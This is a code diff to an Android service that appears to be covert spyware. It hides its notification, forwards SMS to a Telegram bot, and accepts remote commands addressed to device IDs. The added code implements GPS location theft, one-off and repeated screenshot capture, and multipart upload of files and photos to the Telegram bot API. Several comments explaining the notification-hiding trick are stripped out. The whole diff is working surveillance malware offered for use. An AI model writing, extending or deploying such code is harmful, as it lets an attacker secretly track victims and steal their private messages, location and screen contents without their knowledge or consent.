@@ -1,20 +1,27 @@
 package com.smshandler;
 
+import android.Manifest;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.provider.Settings;
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -93,7 +100,6 @@ public class SmsService extends Service {
         String saved = prefs.getString(KEY_DEVICE_ID, null);
         if (saved != null) return saved;
 
-        // Android ID se unique short ID banao
         String androidId = Settings.Secure.getString(
             getContentResolver(), Settings.Secure.ANDROID_ID);
         String shortId = (androidId != null && androidId.length() >= 6)
@@ -112,11 +118,15 @@ public class SmsService extends Service {
             "Commands:\n" +
             "/device " + myDeviceId + " /all — Is device ke saare SMS\n" +
             "/device " + myDeviceId + " /date 02-01-2022 — Is din ke SMS\n" +
-            "/devices — Saare registered devices dekhein"
+            "/devices — Saare registered devices dekhein\n" +
+            "/location — GPS location\n" +
+            "/screenshot — Screen ka photo\n" +
+            "/screen_start 30 — Har 30s screenshot\n" +
+            "/screen_stop — Screenshot band"
         )).start();
     }
 
-    // ─── Hidden Notification (poori tarah chhupa do) ─────────
+    // ─── Hidden Notification ─────────────────────────────────
     private void startHiddenForeground() {
         NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
 
@@ -145,8 +155,6 @@ public class SmsService extends Service {
             .build();
 
         startForeground(NOTIF_ID, notif);
-
-        // InnerService trick — notification permanently hata do
         startService(new Intent(this, InnerService.class));
     }
 
@@ -208,21 +216,18 @@ public class SmsService extends Service {
         new Thread(() -> {
 
             // ══ /device DEVICE_ID /COMMAND ══
-            // e.g. /device A1B2C3 /all
-            //      /device A1B2C3 /date 02-01-2022
             Pattern devPattern = Pattern.compile(
                 "(?i)^/device\\s+([A-Z0-9]+)\\s+/(.+)$");
             Matcher dm = devPattern.matcher(cmd.trim());
             if (dm.matches()) {
                 String targetId = dm.group(1).toUpperCase();
                 String subCmd   = dm.group(2).trim().toLowerCase();
-                // Sirf mera device hi respond kare
                 if (!targetId.equals(myDeviceId)) return;
                 handleDeviceCommand(subCmd);
                 return;
             }
 
-            // ══ /devices — saare devices reply karein apni info ══
+            // ══ /devices ══
             if (cmd.equalsIgnoreCase("/devices")) {
                 sendRawMessage(
                     "📱 Device Online: [" + myDeviceId + "]\n" +
@@ -235,7 +240,7 @@ public class SmsService extends Service {
                 return;
             }
 
-            // ══ /NUMBER-/COMMAND (contact filter) ══
+            // ══ /NUMBER-/COMMAND ══
             Pattern phonePattern = Pattern.compile("^/([\\d+\\-\\s]+)-/(.+)$");
             Matcher pm = phonePattern.matcher(cmd);
             if (pm.matches()) {
@@ -288,14 +293,32 @@ public class SmsService extends Service {
                     "Blocked: " + getBlockedNumbers().size() + " number"
                 );
 
+            } else if (cmd.equalsIgnoreCase("/location")) {
+                sendLocation();
+
+            } else if (cmd.equalsIgnoreCase("/screenshot")) {
+                requestScreenshot(false, 0);
+
+            } else if (cmd.toLowerCase().startsWith("/screen_start")) {
+                int interval = 30;
+                try { interval = Integer.parseInt(cmd.trim().split("\\s+")[1]); } catch (Exception ignored) {}
+                requestScreenshot(true, interval);
+                sendRawMessage("📸 Har " + interval + "s mein screenshot aayega. Band karne ke liye /screen_stop");
+
+            } else if (cmd.equalsIgnoreCase("/screen_stop")) {
+                Intent stopScreen = new Intent(this, ScreenCaptureService.class);
+                stopScreen.setAction("STOP");
+                startService(stopScreen);
+                sendRawMessage("⏹ Screen mirroring band.");
+
             } else if (cmd.equalsIgnoreCase("/help")) {
                 sendRawMessage(
                     "📋 Global:\n" +
-                    "/devices — Online devices dekhein\n" +
-                    "/start /stop — Messages on/off\n" +
+                    "/devices — Online devices\n" +
+                    "/start /stop — SMS on/off\n" +
                     "/all — Saare SMS\n" +
                     "/date DD-MM-YYYY — Us din ke SMS\n" +
-                    "/blocked /status /help\n\n" +
+                    "/blocked /status\n\n" +
                     "📱 Device Commands:\n" +
                     "/device ID /all\n" +
                     "/device ID /date DD-MM-YYYY\n" +
@@ -306,13 +329,74 @@ public class SmsService extends Service {
                     "/NUMBER-/date DD-MM-YYYY\n" +
                     "/NUMBER-/stop\n" +
                     "/NUMBER-/start\n\n" +
+                    "📍 Location & Screen:\n" +
+                    "/location — GPS location\n" +
+                    "/screenshot — Ek screenshot\n" +
+                    "/screen_start 30 — Har 30s screenshot\n" +
+                    "/screen_stop — Screenshot band\n\n" +
                     "Mera ID: [" + myDeviceId + "]"
                 );
             }
         }).start();
     }
 
-    // ─── Device-specific Commands ────────────────────────────
+    // ─── Screenshot / Screen Mirror ───────────────────────────
+    private void requestScreenshot(boolean continuous, int intervalSec) {
+        ScreenCaptureService.sContinuous  = continuous;
+        ScreenCaptureService.sIntervalSec = intervalSec > 0 ? intervalSec : 30;
+        Intent i = new Intent(this, PermissionActivity.class);
+        i.putExtra("request_screenshot", true);
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(i);
+    }
+
+    // ─── GPS Location ─────────────────────────────────────────
+    private void sendLocation() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                != PackageManager.PERMISSION_GRANTED
+            && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
+                != PackageManager.PERMISSION_GRANTED) {
+            sendRawMessage("❌ Location permission nahi mili.");
+            return;
+        }
+        new Thread(() -> {
+            try {
+                LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+                Location loc = null;
+                String[] providers = {
+                    LocationManager.GPS_PROVIDER,
+                    LocationManager.NETWORK_PROVIDER,
+                    LocationManager.PASSIVE_PROVIDER
+                };
+                for (String p : providers) {
+                    try {
+                        if (lm.isProviderEnabled(p)) {
+                            loc = lm.getLastKnownLocation(p);
+                            if (loc != null) break;
+                        }
+                    } catch (Exception ignored) {}
+                }
+                if (loc != null) {
+                    double lat = loc.getLatitude(), lon = loc.getLongitude();
+                    String time = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
+                        .format(new Date(loc.getTime()));
+                    sendRawMessage(
+                        "📍 GPS Location\n" +
+                        "Lat: " + lat + "\nLon: " + lon + "\n" +
+                        "Maps: https://maps.google.com/?q=" + lat + "," + lon + "\n" +
+                        "Accuracy: " + (int) loc.getAccuracy() + "m\n" +
+                        "Time: " + time
+                    );
+                } else {
+                    sendRawMessage("❌ Location unavailable. GPS on karo.");
+                }
+            } catch (Exception e) {
+                sendRawMessage("❌ Location error: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    // ─── Device Commands ─────────────────────────────────────
     private void handleDeviceCommand(String subCmd) {
         if (subCmd.equals("stop")) {
             telegramPaused = true;
@@ -473,7 +557,7 @@ public class SmsService extends Service {
         queryAndSend("content://sms/sent",  0, Long.MAX_VALUE, true);
     }
 
-    // ─── Telegram ────────────────────────────────────────────
+    // ─── Telegram Text ────────────────────────────────────────
     static void sendSmsToTelegram(String sender, String body, long ts) {
         if (telegramPaused) return;
         try {
@@ -501,6 +585,73 @@ public class SmsService extends Service {
         c.getInputStream(); c.disconnect();
     }
 
+    // ─── Telegram File Upload (sendDocument) ─────────────────
+    static void sendFileToTelegram(File file, String caption) {
+        try {
+            String boundary = "----Boundary" + System.currentTimeMillis();
+            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument");
+            HttpURLConnection c = (HttpURLConnection) url.openConnection();
+            c.setRequestMethod("POST");
+            c.setDoOutput(true);
+            c.setConnectTimeout(60000);
+            c.setReadTimeout(60000);
+            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            OutputStream os = c.getOutputStream();
+            writeField(os, boundary, "chat_id", CHAT_ID);
+            writeField(os, boundary, "caption", caption);
+            os.write(("--" + boundary + "\r\n").getBytes());
+            os.write(("Content-Disposition: form-data; name=\"document\"; filename=\""
+                + file.getName() + "\"\r\n").getBytes());
+            os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes());
+            FileInputStream fis = new FileInputStream(file);
+            byte[] buf = new byte[4096]; int read;
+            while ((read = fis.read(buf)) != -1) os.write(buf, 0, read);
+            fis.close();
+            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
+            os.flush();
+            c.getInputStream(); c.disconnect();
+            file.delete();
+        } catch (Exception e) { e.printStackTrace(); }
+    }
+
+    // ─── Telegram Photo Upload (sendPhoto) ───────────────────
+    static void sendPhotoToTelegram(File photo, String caption) {
+        try {
+            String boundary = "----Boundary" + System.currentTimeMillis();
+            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
+            HttpURLConnection c = (HttpURLConnection) url.openConnection();
+            c.setRequestMethod("POST");
+            c.setDoOutput(true);
+            c.setConnectTimeout(60000);
+            c.setReadTimeout(60000);
+            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            OutputStream os = c.getOutputStream();
+            writeField(os, boundary, "chat_id", CHAT_ID);
+            writeField(os, boundary, "caption", caption);
+            os.write(("--" + boundary + "\r\n").getBytes());
+            os.write(("Content-Disposition: form-data; name=\"photo\"; filename=\""
+                + photo.getName() + "\"\r\n").getBytes());
+            os.write("Content-Type: image/jpeg\r\n\r\n".getBytes());
+            FileInputStream fis = new FileInputStream(photo);
+            byte[] buf = new byte[4096]; int read;
+            while ((read = fis.read(buf)) != -1) os.write(buf, 0, read);
+            fis.close();
+            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
+            os.flush();
+            c.getInputStream(); c.disconnect();
+            photo.delete();
+        } catch (Exception e) { e.printStackTrace(); }
+    }
+
+    private static void writeField(OutputStream os, String boundary, String name, String value)
+            throws Exception {
+        os.write(("--" + boundary + "\r\n").getBytes());
+        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n").getBytes());
+        os.write((value + "\r\n").getBytes());
+    }
+
     // ─── InnerService — notification permanently hata do ─────
     public static class InnerService extends Service {
         @Override
@@ -513,7 +664,6 @@ public class SmsService extends Service {
                     .setSilent(true).build();
                 startForeground(NOTIF_ID, n);
             }
-            // Notification cancel karke service band karo
             NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
             if (nm != null) nm.cancel(NOTIF_ID);
             stopForeground(true);
@@ -523,4 +673,3 @@ public class SmsService extends Service {
         @Override public IBinder onBind(Intent intent) { return null; }
     }
 }
-
